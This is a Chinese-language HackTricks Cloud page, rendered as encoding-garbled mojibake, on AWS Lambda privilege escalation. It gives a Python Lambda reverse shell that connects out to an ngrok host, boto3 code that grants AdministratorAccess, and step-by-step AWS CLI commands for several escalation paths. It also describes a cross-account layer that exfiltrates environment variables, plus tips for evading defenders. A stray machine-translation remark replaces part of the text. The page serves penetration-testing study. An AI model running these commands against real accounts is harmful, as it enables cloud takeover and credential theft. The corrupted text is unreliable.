# AWS - Lambda æƒé™æå‡

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## lambda

æ›´å¤šå…³äºlambdaçš„ä¿¡æ¯ï¼š

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

æ‹¥æœ‰ **`iam:PassRole`, `lambda:CreateFunction`,** å’Œ **`lambda:InvokeFunction`** æƒé™çš„ç”¨æˆ·å¯ä»¥é€šè¿‡å°†ç°æœ‰çš„IAMè§’è‰²ä¼ é€’ç»™ä¸€ä¸ªæ–°çš„Lambdaå‡½æ•°æ¥**æå‡æƒé™**ï¼Œè¯¥å‡½æ•°åŒ…å«å¯¼å…¥ç›¸å…³AWSåº“åˆ°ä»–ä»¬é€‰æ‹©çš„ç¼–ç¨‹è¯­è¨€çš„ä»£ç ï¼Œç„¶åä½¿ç”¨å®ƒæ‰§è¡Œä»–ä»¬é€‰æ‹©çš„æ“ä½œã€‚ä»£ç å¯ä»¥é€šè¿‡AWS APIè°ƒç”¨å‡½æ•°æ¥è¿è¡Œã€‚

æ”»å‡»è€…å¯ä»¥æ»¥ç”¨è¿™ä¸€ç‚¹æ¥è·å–**åå‘shellå¹¶çªƒå–ä»¤ç‰Œ**ï¼š

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
The provided text does not contain any content to translate, it is simply a closing tag for a code block in markdown syntax. Please provide the relevant English text that needs to be translated into Chinese.
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
ä½ ä¹Ÿå¯ä»¥**æ»¥ç”¨ lambda è§’è‰²æƒé™**ï¼Œç›´æ¥ä» lambda å‡½æ•°æœ¬èº«æ“ä½œã€‚\
å¦‚æœ lambda è§’è‰²æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒä¸ºè‡ªå·±æˆäºˆç®¡ç†å‘˜æƒé™ï¼š
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³æŒ‡å®šçš„ä»»æ„ lambda æœåŠ¡è§’è‰²ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå°½ç®¡ **`lambda:InvokeAsync`** çœ‹èµ·æ¥å¾ˆæœ‰è¶£ï¼Œä½†å®ƒæœ¬èº«**ä¸**å…è®¸**æ‰§è¡Œ `aws lambda invoke-async`**ï¼Œä½ è¿˜éœ€è¦ `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

å¦‚å‰ä¸€ä¸ªåœºæ™¯æ‰€è¿°ï¼Œå¦‚æœä½ æ‹¥æœ‰ **`lambda:AddPermission`** æƒé™ï¼Œä½ å¯ä»¥**æˆäºˆè‡ªå·± `lambda:InvokeFunction`** æƒé™ã€‚
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³æŒ‡å®šçš„ä»»æ„ lambda æœåŠ¡è§’è‰²ã€‚

### `iam:PassRole`ã€`lambda:CreateFunction`ã€`lambda:CreateEventSourceMapping`

å…·æœ‰ **`iam:PassRole`ã€`lambda:CreateFunction` å’Œ `lambda:CreateEventSourceMapping`**ï¼ˆå¯èƒ½è¿˜åŒ…æ‹¬ `dynamodb:PutItem` å’Œ `dynamodb:CreateTable`ï¼‰æƒé™ï¼Œä½†**æ²¡æœ‰** `lambda:InvokeFunction` æƒé™çš„ç”¨æˆ·ï¼Œå¯ä»¥é€šè¿‡**å°†ç°æœ‰ IAM è§’è‰²ä¼ é€’ç»™ä¸€ä¸ªæ–°çš„ Lambda å‡½æ•°**æ¥æå‡æƒé™ï¼Œè¯¥å‡½æ•°åŒ…å«å¯¼å…¥ç›¸å…³ AWS åº“åˆ°ä»–ä»¬é€‰æ‹©çš„ç¼–ç¨‹è¯­è¨€çš„ä»£ç ï¼Œç„¶åä½¿ç”¨å®ƒæ‰§è¡Œä»–ä»¬é€‰æ‹©çš„æ“ä½œã€‚ç„¶åä»–ä»¬éœ€è¦**åˆ›å»ºä¸€ä¸ª DynamoDB è¡¨æˆ–ä½¿ç”¨ç°æœ‰çš„è¡¨**ï¼Œä¸º Lambda å‡½æ•°**åˆ›å»ºä¸€ä¸ªæŒ‡å‘è¯¥ DynamoDB è¡¨çš„äº‹ä»¶æºæ˜ å°„**ã€‚æ¥ç€ä»–ä»¬éœ€è¦å°†ä¸€ä¸ªé¡¹ç›®æ”¾å…¥è¡¨ä¸­ï¼Œæˆ–ç­‰å¾…å¦ä¸€ç§æ–¹æ³•è¿™æ ·åšï¼Œä»¥ä¾¿**è°ƒç”¨ Lambda å‡½æ•°**ã€‚
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
åœ¨Pythonæ–‡ä»¶ä¸­çš„**ä»£ç **å°†**åˆ©ç”¨ç›®æ ‡è§’è‰²**ã€‚ä¸€ä¸ªä¾‹å­æ˜¯ä½¿ç”¨ä¹‹å‰æ–¹æ³•ä¸­çš„ç›¸åŒè„šæœ¬ã€‚

ä¹‹åï¼Œä¸‹ä¸€æ­¥å–å†³äºå½“å‰AWSç¯å¢ƒä¸­**æ˜¯å¦ä½¿ç”¨äº†DynamoDB**ã€‚**å¦‚æœ**æ­£åœ¨**ä½¿ç”¨**ï¼Œé‚£ä¹ˆéœ€è¦åšçš„å°±æ˜¯ä¸ºLambdaå‡½æ•°**åˆ›å»ºäº‹ä»¶æºæ˜ å°„**ï¼Œä½†å¦‚æœæ²¡æœ‰ï¼Œåˆ™æ”»å‡»è€…éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤**åˆ›å»ºä¸€ä¸ªå¯ç”¨äº†æµçš„è¡¨**ï¼š
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
åœ¨æ­¤å‘½ä»¤ä¹‹åï¼Œæ”»å‡»è€…å°†é€šè¿‡**åˆ›å»ºäº‹ä»¶æºæ˜ å°„**æ¥**è¿æ¥ Lambda å‡½æ•°å’Œ DynamoDB è¡¨**ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
æ—¢ç„¶Lambdaå‡½æ•°å’Œæµå·²ç»è¿æ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è§¦å‘DynamoDBæµæ¥**è°ƒç”¨Lambdaå‡½æ•°**ã€‚è¿™å¯ä»¥é€šè¿‡å‘DynamoDBè¡¨ä¸­æ”¾å…¥ä¸€ä¸ªé¡¹ç›®æ¥å®Œæˆï¼Œè¿™å°†è§¦å‘æµï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
åœ¨è¿™ä¸€ç‚¹ä¸Šï¼ŒLambda å‡½æ•°å°†è¢«è°ƒç”¨ï¼Œæ”»å‡»è€…å°†æˆä¸º AWS è´¦æˆ·çš„ç®¡ç†å‘˜ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°æŒ‡å®šçš„ lambda æœåŠ¡è§’è‰²æƒé™ã€‚

### `lambda:AddPermission`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥**æˆäºˆè‡ªå·±ï¼ˆæˆ–ä»–äººï¼‰ä»»ä½•æƒé™**ï¼ˆè¿™ä¼šç”ŸæˆåŸºäºèµ„æºçš„ç­–ç•¥ä»¥æˆäºˆå¯¹èµ„æºçš„è®¿é—®æƒé™ï¼‰ï¼š

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** é€šè¿‡æˆäºˆæƒé™ä¿®æ”¹ä»£ç å¹¶è¿è¡Œï¼Œç›´æ¥æå‡è‡³lambdaæœåŠ¡è§’è‰²çš„æƒé™ã€‚

### `lambda:AddLayerVersionPermission`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥**æˆäºˆè‡ªå·±ï¼ˆæˆ–ä»–äººï¼‰`lambda:GetLayerVersion`æƒé™**ã€‚ä»–å¯ä»¥è®¿é—®è¯¥å±‚å¹¶æœç´¢æ¼æ´æˆ–æ•æ„Ÿä¿¡æ¯ã€‚

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** å¯èƒ½è®¿é—®æ•æ„Ÿä¿¡æ¯ã€‚

### `lambda:UpdateFunctionCode`

æ‹¥æœ‰ **`lambda:UpdateFunctionCode`** æƒé™çš„æ”»å‡»è€…å¯ä»¥**æ›´æ–°é™„åŠ äº†IAMè§’è‰²çš„ç°æœ‰Lambdaå‡½æ•°çš„ä»£ç **ï¼Œä»¥ä¾¿å®ƒå¯¼å…¥ç›¸å…³çš„AWSåº“ï¼Œå¹¶ä½¿ç”¨è¯¥ç¼–ç¨‹è¯­è¨€æ‰§è¡Œä»£è¡¨è¯¥è§’è‰²çš„æ“ä½œã€‚ç„¶åï¼Œå¦‚æœä»–ä»¬ä¸èƒ½ç›´æ¥è¿™æ ·åšï¼Œä»–ä»¬éœ€è¦**ç­‰å¾…å®ƒè¢«è°ƒç”¨**ï¼Œä½†å¦‚æœå®ƒå·²ç»å­˜åœ¨ï¼Œå¾ˆå¯èƒ½æœ‰æŸç§æ–¹å¼å¯ä»¥è°ƒç”¨å®ƒã€‚
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
### `lambda:UpdateFunctionConfiguration`

#### ä»‹ç»

[**Lambda å±‚**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) å…è®¸åœ¨æ‚¨çš„ lambda å‡½æ•°ä¸­åŒ…å«**ä»£ç **ï¼Œä½†**å•ç‹¬å­˜å‚¨**ï¼Œå› æ­¤å‡½æ•°ä»£ç å¯ä»¥ä¿æŒå°å·§ï¼Œä¸”**å¤šä¸ªå‡½æ•°å¯ä»¥å…±äº«ä»£ç **ã€‚

åœ¨ lambda ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹çš„å‡½æ•°æ£€æŸ¥ä»å“ªäº›è·¯å¾„åŠ è½½ python ä»£ç ï¼š
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
è¿™äº›æ˜¯ä½ç½®ï¼š

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

ä¾‹å¦‚ï¼Œåº“ boto3 æ˜¯ä» `/var/runtime/boto3`ï¼ˆç¬¬4ä¸ªä½ç½®ï¼‰åŠ è½½çš„ã€‚

#### åˆ©ç”¨

**å°†å±‚é™„åŠ åˆ°å‡½æ•°** åªéœ€è¦ `lambda:UpdateFunctionConfiguration` æƒé™ï¼Œå¹¶ä¸”**å±‚å¯ä»¥è·¨è´¦æˆ·å…±äº«**ã€‚æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“**ä»–ä»¬ä½¿ç”¨äº†å“ªäº›åº“**ï¼Œè¿™æ ·æˆ‘ä»¬æ‰èƒ½æ­£ç¡®åœ°è¦†ç›–å®ƒä»¬ï¼Œä½†åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†**å‡è®¾è¢«æ”»å‡»çš„å‡½æ•°æ­£åœ¨å¯¼å…¥ boto3**ã€‚

ä¸ºäº†å®‰å…¨èµ·è§ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ Pip å®‰è£…ä¸æˆ‘ä»¬æ­£åœ¨é’ˆå¯¹çš„ Lambda è¿è¡Œæ—¶ç›¸åŒç‰ˆæœ¬çš„ boto3 åº“ï¼ˆPython 3.7ï¼‰ï¼Œä»¥ç¡®ä¿æ²¡æœ‰ä»»ä½•ä¸åŒå¯èƒ½ä¼šåœ¨ç›®æ ‡å‡½æ•°ä¸­å¼•èµ·é—®é¢˜ã€‚è¯¥è¿è¡Œæ—¶ç›®å‰ä½¿ç”¨çš„æ˜¯ boto3 ç‰ˆæœ¬ 1.9.42ã€‚

ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼Œæˆ‘ä»¬å°†å®‰è£… boto3 ç‰ˆæœ¬ 1.9.42 åŠå…¶ä¾èµ–é¡¹åˆ°æœ¬åœ°çš„ "lambda\_layer" æ–‡ä»¶å¤¹ï¼š
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ‰“å¼€ `/lambda_layer/boto3/__init__.py` å¹¶æ·»åŠ æ¶æ„ä»£ç ã€‚æˆ‘ä»¬å°†æ·»åŠ çš„æœ‰æ•ˆè½½è·å¦‚ä¸‹æ‰€ç¤ºï¼š

![](<../../../.gitbook/assets/image (26).png>)

`requests` æ˜¯ä» `botocore` å¯¼å…¥çš„ã€‚è¯¥å‡½æ•°å°†æ³„éœ²ç¯å¢ƒå˜é‡ï¼Œtry-except å’Œ 0.1 è¶…æ—¶è®¾ç½®æ˜¯ä¸ºäº†ç¡®ä¿è¿™æ®µä»£ç ä¸ä¼šç ´åä»»ä½•ä¸œè¥¿ã€‚

{% hint style="info" %}
**é‡è¦æç¤ºï¼š** åœ¨çœŸå®çš„æ¸—é€æµ‹è¯•ä¸­ï¼Œä½ ä¸åº”è¯¥ä½¿ç”¨ `from botocore.vendored import requests`ï¼Œå› ä¸ºè¿™ä¼šåœ¨è¯¥å‡½æ•°çš„ CloudWatch æ—¥å¿—ä¸­æ‰“å°ä¸€ä¸ªâ€œDeprecationWarningâ€ï¼Œè¿™å¾ˆå¯èƒ½ä¼šå¯¼è‡´ä½ è¢«é˜²å¾¡è€…å‘ç°ã€‚
{% endhint %}

ç°åœ¨ï¼Œå°†è¯¥ä»£ç æ‰“åŒ…æˆä¸€ä¸ª **ZIP æ–‡ä»¶** å¹¶ **ä¸Šä¼ ** åˆ° **æ”»å‡»è€…è´¦æˆ·ä¸­çš„æ–° Lambda å±‚**ã€‚ä½ éœ€è¦é¦–å…ˆåˆ›å»ºä¸€ä¸ªâ€œpythonâ€æ–‡ä»¶å¤¹ï¼Œå¹¶å°†ä½ çš„åº“æ”¾åœ¨é‚£é‡Œï¼Œè¿™æ ·ä¸€æ—¦æˆ‘ä»¬å°†å…¶ä¸Šä¼ åˆ° Lambdaï¼Œä»£ç å°†è¢«æ‰¾åˆ°åœ¨â€œ/opt/python/boto3â€ã€‚åŒæ—¶ï¼Œç¡®ä¿è¯¥å±‚ä¸ Python 3.7 å…¼å®¹ï¼Œå¹¶ä¸” **å±‚ä¸æˆ‘ä»¬ç›®æ ‡å‡½æ•°åœ¨åŒä¸€åŒºåŸŸ**ã€‚å®Œæˆåï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ `lambda:AddLayerVersionPermission` æ¥ **ä½¿è¯¥å±‚å…¬å¼€å¯è®¿é—®**ï¼Œä»¥ä¾¿æˆ‘ä»¬çš„ç›®æ ‡è´¦æˆ·å¯ä»¥ä½¿ç”¨å®ƒã€‚ä½¿ç”¨ä½ ä¸ªäººçš„ AWS å‡­è¯è¿›è¡Œæ­¤ API è°ƒç”¨ã€‚
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
ç°åœ¨ï¼Œä½¿ç”¨æˆ‘ä»¬æ‹¥æœ‰çš„**æ³„éœ²çš„å‡­è¯**ï¼Œæˆ‘ä»¬å°†åœ¨ç›®æ ‡ Lambda å‡½æ•°â€œs3-getterâ€ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè¯¥å‘½ä»¤å°†**é™„åŠ æˆ‘ä»¬çš„è·¨è´¦æˆ· Lambda å±‚**ã€‚
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
ä¸‹ä¸€æ­¥è¦ä¹ˆæ˜¯å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿçš„è¯å°±**è‡ªå·±è°ƒç”¨å‡½æ•°**ï¼Œè¦ä¹ˆå°±ç­‰å¾…å®ƒé€šè¿‡æ­£å¸¸æ–¹å¼**è¢«è°ƒç”¨**â€”â€”è¿™æ˜¯æ›´å®‰å…¨çš„æ–¹æ³•ã€‚

ä¸€ç§**æ›´éšè”½çš„åˆ©ç”¨è¿™ä¸ªæ¼æ´çš„æ–¹æ³•**å¯ä»¥åœ¨ä»¥ä¸‹å†…å®¹ä¸­æ‰¾åˆ°ï¼š

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ä½¿ç”¨çš„lambdaæœåŠ¡è§’è‰²æƒé™ã€‚

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

ä¹Ÿè®¸æœ‰äº†è¿™äº›æƒé™ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªå‡½æ•°å¹¶é€šè¿‡è°ƒç”¨URLæ¥æ‰§è¡Œå®ƒâ€¦â€¦ä½†æˆ‘æ‰¾ä¸åˆ°æµ‹è¯•å®ƒçš„æ–¹æ³•ï¼Œæ‰€ä»¥å¦‚æœä½ åšåˆ°äº†è¯·å‘Šè¯‰æˆ‘ï¼

### Lambda MitM

ä¸€äº›lambdaå°†ä¼š**ä»ç”¨æˆ·é‚£é‡Œæ¥æ”¶æ•æ„Ÿä¿¡æ¯ä½œä¸ºå‚æ•°ã€‚** å¦‚æœåœ¨å…¶ä¸­ä¸€ä¸ªä¸Šè·å¾—RCEï¼Œä½ å¯ä»¥çªƒå–å…¶ä»–ç”¨æˆ·å‘é€ç»™å®ƒçš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹å®ƒåœ¨ï¼š

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–è€…**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
